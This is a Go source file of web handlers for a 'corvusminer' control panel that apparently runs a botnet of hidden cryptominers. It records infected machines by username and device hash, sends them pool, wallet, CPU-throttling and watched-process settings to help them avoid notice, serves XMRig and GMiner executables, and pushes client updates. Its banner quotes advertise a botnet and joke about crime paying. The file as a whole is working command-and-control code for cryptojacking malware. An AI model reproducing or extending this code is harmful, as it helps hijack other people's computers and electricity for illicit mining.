package handlers

import (
	"corvusminer/panel/database"
	"corvusminer/panel/models"
	"corvusminer/panel/session"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var quotes = []string{
	"Before you complain remember this was free.",
	"Hashrate go brrrrr.",
	"Solo mining is worth looking at with 4MH/S upwards.",
	"All donations go towards my nicotine addiction.",
	"Check out my peer to peer botnet, never get taken down again: t.me/lainp2p",
	"t.me/corvusminer - Join the community!",
	"Crime doesn't pay until you cash out.",
}

func getRandomQuote() string {
	rand.Seed(time.Now().UnixNano())
	return quotes[rand.Intn(len(quotes))]
}

// formatUptimeFunc converts minutes to human-readable uptime format
func formatUptimeFunc(minutes int) string {
	if minutes < 0 {
		return "0m"
	}

	if minutes == 0 {
		return "0m"
	}

	days := minutes / (24 * 60)
	hours := (minutes % (24 * 60)) / 60
	mins := minutes % 60

	if days > 0 {
		return fmt.Sprintf("%dd %dh %dm", days, hours, mins)
	} else if hours > 0 {
		return fmt.Sprintf("%dh %dm", hours, mins)
	}
	return fmt.Sprintf("%dm", mins)
}

// Handler handles all HTTP requests
type Handler struct {
	db       *database.DB
	sessions *session.Manager
	baseDir  string
}

// NewHandler creates a new handler with database and base directory
func NewHandler(db *database.DB, baseDir string) *Handler {
	return &Handler{
		db:       db,
		sessions: session.NewManager(),
		baseDir:  baseDir,
	}
}

// renderTemplate is a helper to render HTML templates
func (h *Handler) renderTemplate(w http.ResponseWriter, tmplName string, data interface{}) {
	tmplPath := filepath.Join(h.baseDir, "templates", tmplName)
	tmpl, err := template.ParseFiles(tmplPath)
	if err != nil {
		http.Error(w, "Failed to load template", http.StatusInternalServerError)
		log.Printf("Template error: %v", err)
		return
	}

	err = tmpl.Execute(w, data)
	if err != nil {
		http.Error(w, "Failed to render template", http.StatusInternalServerError)
		log.Printf("Template execution error: %v", err)
	}
}

// Dashboard renders the dashboard page
func (h *Handler) Dashboard(w http.ResponseWriter, r *http.Request) {
	miners, err := h.db.GetMiners()
	if err != nil {
		log.Printf("Error fetching miners: %v", err)
		miners = []models.Miner{}
	}

	config, err := h.db.GetConfig()
	if err != nil {
		log.Printf("Error fetching config: %v", err)
	}

	// Calculate dashboard statistics
	onlineCount := 0
	offlineCount := 0
	cpuCount := 0
	gpuCount := 0
	totalCPUHashrate := 0.0
	totalGPUHashrate := 0.0
	new24h := 0
	new7d := 0

	now := time.Now()
	time24hAgo := now.AddDate(0, 0, -1)
	time7dAgo := now.AddDate(0, 0, -7)

	for _, miner := range miners {
		if miner.Status == "online" {
			onlineCount++
		} else {
			offlineCount++
		}

		if miner.CPUHashRate > 0 {
			cpuCount++
			totalCPUHashrate += miner.CPUHashRate
		}
		if miner.GPUHashRate > 0 {
			gpuCount++
			totalGPUHashrate += miner.GPUHashRate
		}

		// Count new miners by time period
		createdTime := time.Unix(miner.CreatedAt, 0)
		if createdTime.After(time24hAgo) {
			new24h++
		}
		if createdTime.After(time7dAgo) {
			new7d++
		}
	}

	// Limit miners to first 5 for recent display
	recentMiners := miners
	if len(recentMiners) > 5 {
		recentMiners = recentMiners[:5]
	}

	stats := map[string]interface{}{
		"miners":           recentMiners,
		"onlineDevices":    onlineCount,
		"offlineDevices":   offlineCount,
		"cpuMining":        cpuCount,
		"gpuMining":        gpuCount,
		"totalCPUHashrate": totalCPUHashrate,
		"totalGPUHashrate": totalGPUHashrate,
		"new24h":           new24h,
		"new7d":            new7d,
		"config":           config,
		"quote":            getRandomQuote(),
	}

	layoutPath := filepath.Join(h.baseDir, "templates", "layout.html")
	dashboardPath := filepath.Join(h.baseDir, "templates", "dashboard.html")
	tmpl, err := template.ParseFiles(layoutPath, dashboardPath)
	if err != nil {
		log.Printf("Error parsing templates: %v", err)
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	tmpl.ExecuteTemplate(w, "layout", stats)
}

// MinerList renders the miners list page
func (h *Handler) MinerList(w http.ResponseWriter, r *http.Request) {
	miners, err := h.db.GetMiners()
	if err != nil {
		log.Printf("Error fetching miners: %v", err)
		miners = []models.Miner{}
	}

	data := map[string]interface{}{
		"miners": miners,
		"quote":  getRandomQuote(),
	}

	funcMap := template.FuncMap{
		"formatUptime": formatUptimeFunc,
	}

	layoutPath := filepath.Join(h.baseDir, "templates", "layout.html")
	minersPath := filepath.Join(h.baseDir, "templates", "miners.html")
	tmpl, err := template.New("layout").Funcs(funcMap).ParseFiles(layoutPath, minersPath)
	if err != nil {
		log.Printf("Error parsing templates: %v", err)
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	tmpl.ExecuteTemplate(w, "layout", data)
}

// ConfigPage renders the configuration page
func (h *Handler) ConfigPage(w http.ResponseWriter, r *http.Request) {
	config, err := h.db.GetConfig()
	if err != nil {
		log.Printf("Error fetching config: %v", err)
	}

	// Initialize with empty configs if none exist
	cpuConfig := models.MinerConfig{
		MiningURL:    "",
		Wallet:       "",
		Password:     "",
		NonIdleUsage: 0,
		IdleUsage:    0,
		WaitTimeIdle: 0,
		UseSSL:       0,
	}
	gpuConfig := models.MinerConfig{
		MiningURL:    "",
		Wallet:       "",
		Password:     "",
		FanSpeed:     80,
		WaitTimeIdle: 0,
		UseSSL:       0,
	}

	// Parse configs if they exist
	if config != nil {
		if config.CPUConfig != "" {
			if err := json.Unmarshal([]byte(config.CPUConfig), &cpuConfig); err != nil {
				log.Printf("Error parsing CPU config: %v", err)
			}
		}
		if config.GPUConfig != "" {
			if err := json.Unmarshal([]byte(config.GPUConfig), &gpuConfig); err != nil {
				log.Printf("Error parsing GPU config: %v", err)
			}
		}
	}

	data := map[string]interface{}{
		"cpuConfig":        cpuConfig,
		"gpuConfig":        gpuConfig,
		"enableCPU":        1,
		"enableGPU":        1,
		"watchedProcesses": "",
		"quote":            getRandomQuote(),
	}

	// Set actual enable values if config exists
	if config != nil {
		data["enableCPU"] = config.EnableCPU
		data["enableGPU"] = config.EnableGPU
		data["watchedProcesses"] = config.WatchedProcesses
	}

	layoutPath := filepath.Join(h.baseDir, "templates", "layout.html")
	configPath := filepath.Join(h.baseDir, "templates", "config.html")
	tmpl, err := template.ParseFiles(layoutPath, configPath)
	if err != nil {
		log.Printf("Error parsing templates: %v", err)
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	tmpl.ExecuteTemplate(w, "layout", data)
}

// GetMiners returns miners as JSON
func (h *Handler) GetMiners(w http.ResponseWriter, r *http.Request) {
	miners, err := h.db.GetMiners()
	if err != nil {
		log.Printf("Error fetching miners: %v", err)
		http.Error(w, "Error fetching miners", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(miners)
}

// DeleteMiner handles removing a miner
func (h *Handler) DeleteMiner(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	id, err := strconv.Atoi(r.FormValue("id"))
	if err != nil {
		http.Error(w, "Invalid miner ID", http.StatusBadRequest)
		return
	}

	if err := h.db.DeleteMiner(id); err != nil {
		log.Printf("Error deleting miner: %v", err)
		http.Error(w, "Error deleting miner", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"message": "Miner deleted successfully",
	})
}

// DeleteStaleMiners handles removing miners that haven't checked in after specified days
func (h *Handler) DeleteStaleMiners(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	days, err := strconv.Atoi(r.FormValue("days"))
	if err != nil || days <= 0 {
		http.Error(w, "Invalid number of days", http.StatusBadRequest)
		return
	}

	rowsAffected, err := h.db.DeleteStaleMiners(days)
	if err != nil {
		log.Printf("Error deleting stale miners: %v", err)
		http.Error(w, "Error deleting stale miners", http.StatusInternalServerError)
		return
	}

	log.Printf("Deleted %d stale miners (no checkin for %d days)", rowsAffected, days)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": fmt.Sprintf("Deleted %d stale miners", rowsAffected),
		"deleted": rowsAffected,
	})
}

// GetConfig returns configuration as JSON
func (h *Handler) GetConfig(w http.ResponseWriter, r *http.Request) {
	config, err := h.db.GetConfig()
	if err != nil {
		log.Printf("Error fetching config: %v", err)
		http.Error(w, "Error fetching config", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(config)
}

// UpdateConfig handles configuration updates
func (h *Handler) UpdateConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var data map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Log received data for debugging
	log.Printf("Received config update data: %+v", data)

	// Get current config to preserve ID
	cfg, err := h.db.GetConfig()
	if err != nil {
		log.Printf("Error fetching config: %v", err)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Error fetching config",
		})
		return
	}

	// Build CPU config JSON
	cpuConfig := map[string]interface{}{
		"mining_url":     data["cpu_mining_url"],
		"wallet":         data["cpu_wallet"],
		"password":       data["cpu_password"],
		"non_idle_usage": data["cpu_non_idle_usage"],
		"idle_usage":     data["cpu_idle_usage"],
		"wait_time_idle": data["wait_time_idle"],
		"use_ssl":        data["cpu_use_ssl"],
	}
	log.Printf("CPU config map: %+v", cpuConfig)
	cpuJSON, err := json.Marshal(cpuConfig)
	if err != nil {
		log.Printf("Error marshaling CPU config: %v", err)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Error creating CPU config",
		})
		return
	}

	// Build GPU config JSON
	gpuConfig := map[string]interface{}{
		"mining_url":     data["gpu_mining_url"],
		"wallet":         data["gpu_wallet"],
		"password":       data["gpu_password"],
		"algo":           data["gpu_algo"],
		"fan_speed":      data["gpu_fan_speed"],
		"wait_time_idle": data["wait_time_idle"],
		"use_ssl":        data["gpu_use_ssl"],
	}
	gpuJSON, err := json.Marshal(gpuConfig)
	if err != nil {
		log.Printf("Error marshaling GPU config: %v", err)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Error creating GPU config",
		})
		return
	}

	// Update config with JSON strings and enable flags
	cfg.CPUConfig = string(cpuJSON)
	cfg.GPUConfig = string(gpuJSON)
	cfg.GPUAlgo = fmt.Sprintf("%v", data["gpu_algo"])

	// Parse enable flags
	if enable, ok := data["cpu_enabled"].(bool); ok && enable {
		cfg.EnableCPU = 1
	} else {
		cfg.EnableCPU = 0
	}

	if enable, ok := data["gpu_enabled"].(bool); ok && enable {
		cfg.EnableGPU = 1
	} else {
		cfg.EnableGPU = 0
	}

	// Store watched_processes as comma-separated string (blank = none)
	if wp, ok := data["watched_processes"].(string); ok {
		cfg.WatchedProcesses = wp
	} else {
		cfg.WatchedProcesses = ""
	}

	if err := h.db.UpdateConfig(*cfg); err != nil {
		log.Printf("Error updating config: %v", err)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Error updating config",
		})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Config updated successfully",
	})
}

// MinerSubmit handles miner device info submission and returns configuration
func (h *Handler) MinerSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var report models.MinerReport
	if err := json.NewDecoder(r.Body).Decode(&report); err != nil {
		log.Printf("Error decoding miner report: %v", err)
		http.Error(w, "Invalid request format", http.StatusBadRequest)
		return
	}

	// Validate required fields
	if report.DeviceHash == "" || report.PCUsername == "" {
		http.Error(w, "Missing required fields: device_hash, pc_username", http.StatusBadRequest)
		return
	}

	report.Timestamp = time.Now().Unix()

	// Update or create miner record
	if err := h.db.UpsertMiner(&report); err != nil {
		log.Printf("Error upserting miner: %v", err)
		http.Error(w, "Error updating miner data", http.StatusInternalServerError)
		return
	}

	log.Printf("Miner %s (%s) updated: CPU Hashrate=%.2f H/s, GPU Hashrate=%.2f H/s",
		report.PCUsername, report.DeviceHash, report.CPUHashrate, report.GPUHashrate)

	// Get current configuration
	cfg, err := h.db.GetConfig()
	if err != nil {
		log.Printf("Error fetching config: %v", err)
		http.Error(w, "Error fetching configuration", http.StatusInternalServerError)
		return
	}

	// Return raw config - the miner will determine which config (CPU/GPU) to use
	// Parse watched_processes into a JSON array for the client
	watchedArr := []string{}
	if cfg.WatchedProcesses != "" {
		for _, p := range strings.Split(cfg.WatchedProcesses, ",") {
			p = strings.TrimSpace(p)
			if p != "" {
				watchedArr = append(watchedArr, p)
			}
		}
	}

	response := map[string]interface{}{
		"cpu_config":        json.RawMessage(cfg.CPUConfig),
		"gpu_config":        json.RawMessage(cfg.GPUConfig),
		"enable_cpu":        cfg.EnableCPU,
		"enable_gpu":        cfg.EnableGPU,
		"watched_processes": watchedArr,
		"timestamp":         time.Now().Unix(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)

	log.Printf("Miner %s (%s) submitted: CPU %s @ %.2f H/s, GPU %s @ %.2f H/s",
		report.PCUsername, report.DeviceHash, report.CPUName, report.CPUHashrate,
		report.GPUName, report.GPUHashrate)
}

// Donations renders the donations page with crypto addresses
func (h *Handler) Donations(w http.ResponseWriter, r *http.Request) {
	data := map[string]interface{}{
		"quote": getRandomQuote(),
	}

	layoutPath := filepath.Join(h.baseDir, "templates", "layout.html")
	donationsPath := filepath.Join(h.baseDir, "templates", "donations.html")
	tmpl, err := template.ParseFiles(layoutPath, donationsPath)
	if err != nil {
		log.Printf("Error parsing templates: %v", err)
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	tmpl.ExecuteTemplate(w, "layout", data)
}

// ServeXMRig serves the XMRig miner binary
func (h *Handler) ServeXMRig(w http.ResponseWriter, r *http.Request) {
	resourcePath := filepath.Join(h.baseDir, "static", "resources", "xmrig.exe")

	// Check if file exists
	if _, err := os.Stat(resourcePath); os.IsNotExist(err) {
		log.Printf("XMRig binary not found at: %s", resourcePath)
		http.Error(w, "XMRig binary not found", http.StatusNotFound)
		return
	}

	// Open file
	file, err := os.Open(resourcePath)
	if err != nil {
		log.Printf("Error opening XMRig binary: %v", err)
		http.Error(w, "Error reading XMRig binary", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// Get file info for size
	fileInfo, err := file.Stat()
	if err != nil {
		log.Printf("Error getting XMRig file info: %v", err)
		http.Error(w, "Error reading XMRig binary", http.StatusInternalServerError)
		return
	}

	// Set headers
	w.Header().Set("Content-Disposition", "attachment; filename=xmrig.exe")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))

	// Send file
	if _, err := io.Copy(w, file); err != nil {
		log.Printf("Error sending XMRig binary: %v", err)
		return
	}

	log.Printf("Served XMRig binary to: %s", r.RemoteAddr)
}

// ServeGMiner serves the GMiner binary
func (h *Handler) ServeGMiner(w http.ResponseWriter, r *http.Request) {
	resourcePath := filepath.Join(h.baseDir, "static", "resources", "gminer.exe")

	// Check if file exists
	if _, err := os.Stat(resourcePath); os.IsNotExist(err) {
		log.Printf("GMiner binary not found at: %s", resourcePath)
		http.Error(w, "GMiner binary not found", http.StatusNotFound)
		return
	}

	// Open file
	file, err := os.Open(resourcePath)
	if err != nil {
		log.Printf("Error opening GMiner binary: %v", err)
		http.Error(w, "Error reading GMiner binary", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// Get file info for size
	fileInfo, err := file.Stat()
	if err != nil {
		log.Printf("Error getting GMiner file info: %v", err)
		http.Error(w, "Error reading GMiner binary", http.StatusInternalServerError)
		return
	}

	// Set headers
	w.Header().Set("Content-Disposition", "attachment; filename=gminer.exe")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))

	// Send file
	if _, err := io.Copy(w, file); err != nil {
		log.Printf("Error sending GMiner binary: %v", err)
		return
	}

	log.Printf("Served GMiner binary to: %s", r.RemoteAddr)
}

// UpdatesPage handles displaying the updates management page
func (h *Handler) UpdatesPage(w http.ResponseWriter, r *http.Request) {
	data := map[string]interface{}{
		"quote": getRandomQuote(),
	}

	layoutPath := filepath.Join(h.baseDir, "templates", "layout.html")
	updatesPath := filepath.Join(h.baseDir, "templates", "updates.html")
	tmpl, err := template.ParseFiles(layoutPath, updatesPath)
	if err != nil {
		log.Printf("Error parsing templates: %v", err)
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	tmpl.ExecuteTemplate(w, "layout", data)
}

// UploadUpdate handles uploading a new client update
func (h *Handler) UploadUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Parse the multipart form
	if err := r.ParseMultipartForm(100 * 1024 * 1024); err != nil { // 100MB max
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to parse form"})
		return
	}

	version := r.FormValue("version")
	isCurrent := r.FormValue("isCurrent") == "1"

	if version == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Version required"})
		return
	}

	// Get uploaded file
	file, handler, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to get file"})
		return
	}
	defer file.Close()

	// Create updates directory if it doesn't exist
	updatesDir := filepath.Join(h.baseDir, "updates")
	if err := os.MkdirAll(updatesDir, 0755); err != nil {
		log.Printf("Error creating updates directory: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to create updates directory"})
		return
	}

	// Save file with version as part of filename
	filename := fmt.Sprintf("corvusminer-v%s-%s", version, handler.Filename)
	filepath_ := filepath.Join(updatesDir, filename)

	dst, err := os.Create(filepath_)
	if err != nil {
		log.Printf("Error creating file: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to save file"})
		return
	}
	defer dst.Close()

	if _, err := io.Copy(dst, file); err != nil {
		log.Printf("Error copying file: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to save file"})
		return
	}

	// Store in database
	if err := h.db.AddUpdate(version, filename, isCurrent); err != nil {
		log.Printf("Error adding update to database: %v", err)
		// Try to remove the file if DB insert fails
		os.Remove(filepath_)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to save update metadata"})
		return
	}

	log.Printf("Update v%s uploaded successfully", version)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"message": fmt.Sprintf("Version %s uploaded", version)})
}

// ListUpdates returns all updates as JSON
func (h *Handler) ListUpdates(w http.ResponseWriter, r *http.Request) {
	updates, err := h.db.GetUpdates()
	if err != nil {
		log.Printf("Error fetching updates: %v", err)
		http.Error(w, "Error fetching updates", http.StatusInternalServerError)
		return
	}

	if updates == nil {
		updates = []map[string]interface{}{}
	}

	// Add download URLs to each update
	for i, update := range updates {
		filename := update["filename"].(string)
		update["download_url"] = "/updates/" + filename
		updates[i] = update
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(updates)
}

// SetCurrentUpdate marks an update as the current version
func (h *Handler) SetCurrentUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	id := r.FormValue("id")
	if id == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "ID required"})
		return
	}

	var updateID int
	_, err := fmt.Sscanf(id, "%d", &updateID)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Invalid ID"})
		return
	}

	if err := h.db.SetCurrentUpdate(updateID); err != nil {
		log.Printf("Error setting current update: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to set current update"})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"message": "Update set as current"})
}

// GetCurrentVersion returns the current client version (public endpoint for clients)
func (h *Handler) GetCurrentVersion(w http.ResponseWriter, r *http.Request) {
	current, err := h.db.GetCurrentUpdate()
	if err != nil {
		log.Printf("Error fetching current version: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to fetch version"})
		return
	}

	if current == nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"version":      "1.0.0",
			"filename":     "",
			"download_url": "",
		})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"version":      current["version"],
		"filename":     current["filename"],
		"download_url": "/updates/" + current["filename"].(string),
	})
}

// DeleteUpdate removes an update file and database record
func (h *Handler) DeleteUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	id := r.FormValue("id")
	if id == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "ID required"})
		return
	}

	var updateID int
	_, err := fmt.Sscanf(id, "%d", &updateID)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Invalid ID"})
		return
	}

	// Delete from database and get filename
	filename, err := h.db.DeleteUpdate(updateID)
	if err != nil {
		log.Printf("Error deleting update: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Failed to delete update"})
		return
	}

	// Delete file from disk
	updatesDir := filepath.Join(h.baseDir, "updates")
	filePath := filepath.Join(updatesDir, filename)
	if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
		log.Printf("Error deleting update file: %v", err)
		// Don't return error - DB was deleted successfully even if file deletion failed
	}

	log.Printf("Update %s deleted successfully", filename)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"message": "Update deleted"})
}
